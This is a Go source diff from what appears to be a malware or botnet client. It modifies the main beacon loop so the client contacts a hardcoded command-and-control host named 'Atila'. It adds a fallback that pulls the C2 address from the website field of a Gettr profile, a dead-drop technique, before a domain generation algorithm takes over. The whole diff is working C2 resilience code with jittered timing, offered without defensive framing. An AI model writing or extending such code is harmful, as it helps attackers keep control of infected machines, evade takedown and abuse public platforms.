@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"net/url"
 	"time"
 
 	"github.com/google/uuid"
@@ -66,11 +67,31 @@ func tick(host string) bool {
 func main() {
 	rand.Seed(time.Now().UnixNano())
 	for range time.Tick(time.Second + time.Duration(rand.Intn(maxLoopWait-minLoopWait)+maxLoopWait)) {
-		// We need to reach out to hardcoded host just in case.
-		if tick(atilaHost) {
-			// Reset the timer of DGA and move on...
-			lastContactMade = timeSinceJesus()
-			continue
+		// We need to reach out to hardcoded host of Atila. (cnc)
+		parsedAtilaUrl, err := url.Parse(atilaHost)
+		if err == nil {
+			if _, err := net.LookupIP(parsedAtilaUrl.Host); err == nil {
+				if tick(atilaHost) {
+					// Reset the timer of DGA and move on...
+					lastContactMade = timeSinceJesus()
+					continue
+				}
+			}
+		}
+
+		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
+		gettrAtilaHost, err := gettrProfileWebsite(gettrProfileName)
+		if err == nil {
+			parsedAtilaUrl, err = url.Parse(gettrAtilaHost)
+			if err == nil {
+				if _, err := net.LookupIP(parsedAtilaUrl.Host); err == nil {
+					if tick(gettrAtilaHost) {
+						// Reset the timer of DGA and move on...
+						lastContactMade = timeSinceJesus()
+						continue
+					}
+				}
+			}
 		}
 
 		// Check if DGA should kick it.
